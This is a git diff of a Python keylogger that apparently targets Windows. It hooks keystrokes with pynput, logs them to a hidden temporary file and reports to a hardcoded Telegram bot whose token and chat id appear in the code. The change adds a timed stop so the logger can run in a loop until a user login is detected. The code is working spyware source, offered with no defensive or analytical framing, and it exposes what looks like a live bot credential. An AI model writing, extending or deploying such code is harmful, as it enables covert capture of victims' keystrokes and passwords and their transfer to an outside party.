@@ -12,6 +12,7 @@ import ctypes
 import ctypes.wintypes
 from pynput.keyboard import Key, Listener
 import logging
+import threading
 
 chat_id = "-4102145810"
 token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
@@ -83,21 +84,35 @@ def is_user_logged_in():
         
     return False
 
-def keylogger():
-    temp_file = tempfile.NamedTemporaryFile(delete=False)
-    log_file_path = temp_file.name
+def keylogger(file, timeout):
+    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-    logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    stop_listener = threading.Event()
 
     def on_press(key):
         logging.info(str(key))
 
+    def stop_after_delay():
+        stop_listener.wait(timeout)
+        stop_listener.set()
+        listener.stop()
+
+    timer_thread = threading.Thread(target=stop_after_delay)
+    timer_thread.start()
+
     with Listener(on_press=on_press) as listener:
-        listener.join()
+        stop_listener.wait()
+        listener.stop()
+
+    timer_thread.join()
+
+temp_file = tempfile.NamedTemporaryFile(delete=False)
+log_file_path = temp_file.name
+print(log_file_path)
 
 while True:
     if is_user_logged_in():
         send_message(chat_id, token, "userlogged")
         break
     else:
-        keylogger()
+        keylogger(log_file_path, 10)
